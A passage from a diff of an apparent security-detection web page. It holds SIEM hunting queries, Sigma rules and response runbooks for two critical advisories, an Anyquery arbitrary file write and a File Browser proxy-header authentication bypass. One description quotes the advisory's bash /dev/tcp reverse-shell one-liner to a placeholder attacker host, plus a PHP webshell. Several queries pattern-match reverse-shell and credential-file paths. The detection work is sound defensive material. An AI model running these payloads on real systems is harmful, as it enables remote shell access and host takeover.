host.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc3-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc3-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-241-uc3-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>Syslog
-| where TimeGenerated &gt; ago(7d)
-| where ProcessName has &quot;anyquery&quot; or SyslogMessage has &quot;anyquery&quot;
-| where SyslogMessage has &quot;ATTACH DATABASE&quot;
-| where SyslogMessage has_any (&quot;/etc/cron&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;, &quot;/var/spool/cron&quot;, &quot;.php&quot;, &quot;authorized_keys&quot;)
-| project TimeGenerated, Computer, ProcessName, SyslogMessage
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc3-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.syslog @process.name:anyquery (*&quot;ATTACH DATABASE&quot;* OR *&quot;attach database&quot;*) (*/etc/cron* OR */var/www* OR */root/.ssh* OR */var/spool/cron* OR *.php*)</code></pre></div>
-    <div class="tab-content" id="art-241-uc3-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><pre><button class="copy-btn">COPY</button><code>index=* (sourcetype=anyquery OR source=&quot;*anyquery*&quot; OR sourcetype=syslog) &quot;ATTACH DATABASE&quot; (&quot;/etc/cron&quot; OR &quot;/var/www&quot; OR &quot;/root/.ssh&quot; OR &quot;/var/spool/cron&quot; OR &quot;.php&quot;)
-| stats count min(_time) as firstTime max(_time) as lastTime values(_raw) as sample by host
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="a657afc69c" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
-  <summary>
-    <span class="uc-title">Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="a657afc69c" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Detects execution of the reverse-shell payload the article writes via ATTACH DATABASE: a cron- or web-server-parented shell invoking a /dev/tcp bash reverse connection. This is the downstream RCE stage after the arbitrary file write of CVE-2026-50006.
-
-Rationale: Matches the article&#x27;s exact PoC payload `bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/1337 0&gt;&amp;1` executed from a cron parent, plus the PHP webshell `system($_GET[cmd])` spawning shells from php/httpd/nginx. The /dev/tcp + service-parent pairing is high-fidelity and article-specific.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Scheduled Task/Job: Cron">T1053.003</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate cron-scheduled health-check scripts using /dev/tcp to test port reachability</li><li>Developer debugging a service with a bash /dev/tcp one-liner</li><li>Monitoring agents that shell out from php-fpm/nginx for diagnostics</li><li>CI/CD job under a web-server account running network test snippets</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessCommandLine has &quot;healthcheck&quot; or ProcessCommandLine has &quot;healthcheck&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: extract the reverse-shell destination IP/port from the command line and confirm the parent (cron entry or web PID); pull the offending cron file / webshell. 2) Contain: isolate the host, kill the shell and parent, block the C2 IP at the firewall. 3) Hunt: trace back to the Anyquery file-write and ATTACH DATABASE query that dropped the payload, and sweep other hosts running vulnerable Anyquery for identical cron/webroot artifacts.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc4-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-241-uc4-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-241-uc4-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-241-uc4-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc4-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;cron&quot;,&quot;crond&quot;,&quot;php&quot;,&quot;php-fpm&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;)
-| where ProcessCommandLine has &quot;/dev/tcp/&quot; or (ProcessCommandLine has &quot;bash&quot; and ProcessCommandLine has_any (&quot;&gt;&amp; /dev/tcp&quot;,&quot;0&gt;&amp;1&quot;))
-| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(7d)
-| where ParentProcessName has_any (&quot;cron&quot;,&quot;crond&quot;,&quot;php&quot;,&quot;php-fpm&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
-| where TargetProcessCommandLine has &quot;/dev/tcp/&quot; or TargetProcessCommandLine has &quot;0&gt;&amp;1&quot;
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, TargetProcessName, TargetProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc4-sigma"><pre><button class="copy-btn">COPY</button><code>title: Reverse Shell Via Cron Or Webserver Parented dev tcp
-id: 2f7a9c05-4e1d-4b3a-8f6c-0d2e5a7b1c44
-description: Detects a cron or web-server parented shell invoking a /dev/tcp bash reverse connection, the RCE payload dropped via Anyquery ATTACH DATABASE AFW (CVE-2026-50006).
-references:
-  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
-author: SOC Detection Engineering
-date: 2026/07/15
-tags:
-  - attack.t1059.004
-  - attack.t1053.003
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection_parent:
-    ParentImage|endswith:
-      - &#x27;/cron&#x27;
-      - &#x27;/crond&#x27;
-      - &#x27;/php&#x27;
-      - &#x27;/php-fpm&#x27;
-      - &#x27;/apache2&#x27;
-      - &#x27;/httpd&#x27;
-      - &#x27;/nginx&#x27;
-  selection_cmd:
-    CommandLine|contains:
-      - &#x27;/dev/tcp/&#x27;
-      - &#x27;0&gt;&amp;1&#x27;
-  condition: selection_parent and selection_cmd
-level: high</code></pre></div>
-    <div class="tab-content" id="art-241-uc4-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.command_line:*/dev/tcp/*</code></pre></div>
-    <div class="tab-content" id="art-241-uc4-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/(cron|crond|php|php-fpm|apache2|httpd|nginx)/i
-| regex(&quot;/dev/tcp/&quot;, field=CommandLine)
-| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-241-uc4-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*/dev/tcp/*&quot; Processes.parent_process_name IN (cron,crond,php,php-fpm,apache2,httpd,nginx,sh,bash) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
-| `drop_dm_object_name(Processes)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*/dev/tcp/*&quot; Processes.parent_process_name IN (cron,crond,php,php-fpm,apache2,httpd,nginx,sh,bash) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
-| `drop_dm_object_name(Processes)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
-  <summary>
-    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
-    <span class="uc-phase">Reconnaissance</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc5-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc5-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc5-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
-// partitions on Timestamp instead of scanning the full retention.
-DeviceTvmSoftwareVulnerabilities
-| where Timestamp &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-50006&quot;)
-| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-241-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
-// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
-// no Sentinel translation — track via Update / Heartbeat OS-version
-// gaps as a coarse approximation.
-DeviceTvmSoftwareVulnerabilities
-| where TimeGenerated &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-50006&quot;)
-| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId,
-          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-241-uc5-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-50006&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-241-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-50006&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="80c2c6c1cc" data-platforms="def,sent,spl" data-targets="linux,windows">
-  <summary>
-    <span class="uc-title">Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou</span>
-    <span class="uc-phase">Installation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="80c2c6c1cc" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="User Execution: Malicious File">T1204.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc6-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc6-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc6-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where Timestamp &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FolderPath has_any (&quot;/var/www/html/shell.php&quot;, &quot;/etc/cron.d/pwn&quot;, &quot;/root/.ssh/authorized_keys&quot;, &quot;/etc/cron.d&quot;, &quot;/var/spool/cron/crontabs/&quot;, &quot;/dev/tcp/ATTACKER_IP/1337&quot;, &quot;/tmp/pwn.db&quot;))
-| project Timestamp, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
-// Requires the Microsoft 365 Defender data connector (streams the
-// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
-// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where TimeGenerated &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FolderPath has_any (&quot;/var/www/html/shell.php&quot;, &quot;/etc/cron.d/pwn&quot;, &quot;/root/.ssh/authorized_keys&quot;, &quot;/etc/cron.d&quot;, &quot;/var/spool/cron/crontabs/&quot;, &quot;/dev/tcp/ATTACKER_IP/1337&quot;, &quot;/tmp/pwn.db&quot;))
-| project TimeGenerated, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc6-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc6-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou ```
-| tstats `summariesonly` count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_path=&quot;*/var/www/html/shell.php*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d/pwn*&quot; OR Filesystem.file_path=&quot;*/root/.ssh/authorized_keys*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d*&quot; OR Filesystem.file_path=&quot;*/var/spool/cron/crontabs/*&quot; OR Filesystem.file_path=&quot;*/dev/tcp/ATTACKER_IP/1337*&quot; OR Filesystem.file_path=&quot;*/tmp/pwn.db*&quot;)
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-241-uc6-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou ```
-| tstats summariesonly=false count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_path=&quot;*/var/www/html/shell.php*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d/pwn*&quot; OR Filesystem.file_path=&quot;*/root/.ssh/authorized_keys*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d*&quot; OR Filesystem.file_path=&quot;*/var/spool/cron/crontabs/*&quot; OR Filesystem.file_path=&quot;*/dev/tcp/ATTACKER_IP/1337*&quot; OR Filesystem.file_path=&quot;*/tmp/pwn.db*&quot;)
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre></div></div>
-  </div>
-</details></div>
-</article>
 <article class="card" id="art-242" data-art-slug="2026-07-14-ghsa-critical-cve-2026-45262-facturascripts-authenticated-sq"
   data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
   data-techs="T1190"
@@ -13700,4 +13192,570 @@ level: high
 <div class="phase-line "><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
 </div>
   <div class="usecases"></div>
+</article>
+<article class="card" id="art-269" data-art-slug="2026-07-10-ghsa-critical-cve-2026-54089-file-browser-authentication-byp"
+  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
+  data-techs="T1190,T1528"
+  data-sources="GitHub Security Advisories"
+  data-platforms="datadog,def,falcon,sent,sigma,spl"
+  data-splunk-cats="application,cloud,endpoint,network,web"
+  data-targets="azure,linux,vcs,windows"
+  data-uc-count="8" data-llm-uc-count="6"
+  data-search="[GHSA / CRITICAL] CVE-2026-54089: File Browser: Authentication Bypass via Proxy Auth Header Forgery File Browser: Authentication Bypass via Proxy Auth Header Forgery CVE-2026-54089 T1190 T1528 [LLM] FileBrowser reverse-proxy bypass: direct external access to exposed port 8085 [LLM] FileBrowser proxy-auth header forgery naming admin on /api/login [LLM] FileBrowser auto-account-creation: first-seen username in proxy auth header [LLM] FileBrowser post-bypass admin API actions (DELETE/PUT /api/users, /api/settings) [LLM] FileBrowser identity-cycling: 3+ user identities from one untrusted source in 5 min [LLM] FileBrowser instance configured with auth.method=proxy (exploitable-config exposure) Asset exposure — vulnerability matches article CVE(s) OAuth consent / suspicious app grant">
+  <div class="sev-ribbon crit">Critical</div>
+  <button class="share-btn card-share" data-share-art="2026-07-10-ghsa-critical-cve-2026-54089-file-browser-authentication-byp" title="Copy share link to this article" aria-label="Copy share link">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+  </button>
+  <h2><a href="https://github.com/advisories/GHSA-xqp3-jq6g-x3qm" target="_blank" rel="noopener">[GHSA / CRITICAL] CVE-2026-54089: File Browser: Authentication Bypass via Proxy Auth Header Forgery</a></h2>
+  <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
+  <div class="pubmeta">
+    <span>2026-07-10</span>
+    <span>8 use cases</span>
+    <span>2 techniques</span>
+    <span>6 kill-chain phases detected</span>
+  </div>
+  <p class="summary">File Browser: Authentication Bypass via Proxy Auth Header Forgery</p>
+  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-54089</span></div>
+<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Steal Application Access Token">T1528</span></div>
+  <div class="action-row">
+    <button class="btn btn-kc" data-target="art-269-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
+    <button class="btn btn-hunt" data-hunt-art="art-269"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
+    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
+  </div>
+  <div class="killchain" id="art-269-kc">
+  <div class="kc3d"><div class="kc-cell hit">
+  <div class="num">Phase 1</div>
+  <div class="name">Reconnaissance</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 2</div>
+  <div class="name">Weaponization</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 3</div>
+  <div class="name">Delivery</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 4</div>
+  <div class="name">Exploitation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 5</div>
+  <div class="name">Installation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 6</div>
+  <div class="name">Command &amp; Control</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 7</div>
+  <div class="name">Actions on Objectives</div>
+  <div class="marker">Detected</div>
+</div></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ [LLM] FileBrowser instance configured with auth.method=proxy (exploitable-config exposure) · Asset exposure — vulnerability matches article CVE(s)</em></div>
+<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). <em>→ [LLM] FileBrowser reverse-proxy bypass: direct external access to exposed port 8085</em></div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] FileBrowser proxy-auth header forgery naming admin on /api/login · [LLM] FileBrowser identity-cycling: 3+ user identities from one untrusted source in 5 min</em></div>
+<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] FileBrowser auto-account-creation: first-seen username in proxy auth header</em></div>
+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
+<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] FileBrowser post-bypass admin API actions (DELETE/PUT /api/users, /api/settings) · OAuth consent / suspicious app grant</em></div></div>
+</div>
+  <div class="usecases"><details class="uc" data-uc-slug="cef605b1ee" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="vcs,windows" open>
+  <summary>
+    <span class="uc-title">FileBrowser reverse-proxy bypass: direct external access to exposed port 8085</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="cef605b1ee" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts inbound connections that reach the FileBrowser container port (published as 8085 via Docker -p 8085:80) directly from a public/untrusted source, bypassing the reverse proxy (nginx/Traefik/Caddy) that is the sole security boundary for auth.method=proxy. Because auth/proxy.go has zero origin validation, any client that can reach the port directly can forge the X-Remote-User header, so a direct external hit on the exposed port is the network pre-condition for CVE-2026-54089 exploitation.
+
+Rationale: Article states exploitation requires an attacker who &#x27;can reach the server directly&#x27; and cites Docker &#x27;-p 8085:80&#x27; publishing to 0.0.0.0; a direct public hit on 8085 is the network pre-condition for the header-forgery bypass. Cross-checked against the GHSA advisory and the auth/proxy.go root-cause writeup.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://advisories.gitlab.com/golang/github.com/filebrowser/filebrowser/v2/CVE-2026-54089/
+  • https://cvereports.com/reports/CVE-2026-54089</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Trusted Relationship">T1199</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Internet-wide scanners (Shodan/Censys/Palo Alto Expanse) probing the exposed port</li><li>External uptime/health-check monitors (Pingdom, UptimeRobot) hitting the port for availability</li><li>A sysadmin intentionally reaching the port directly for debugging as described in the article</li><li>Cloud load-balancer or NAT gateway health probes that appear as public IPs</li><li>Security team&#x27;s own external attack-surface scans</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm the FileBrowser instance runs auth.method=proxy and that 8085 is meant to be proxy-only; identify the reverse-proxy egress IP set and check whether SourceIP is outside it. 2) Contain: firewall/security-group the container port to the reverse proxy IP only (bind 127.0.0.1 or restrict inbound), and rotate the JWT signing key to invalidate any minted tokens. 3) Hunt: pull FileBrowser/WAF logs for /api/login requests from the same SourceIP carrying an X-Remote-User header and for any user accounts created in the last 30 days (auto-creation primitive).</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc0-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-269-uc0-sentinel">Sentinel KQL</button>
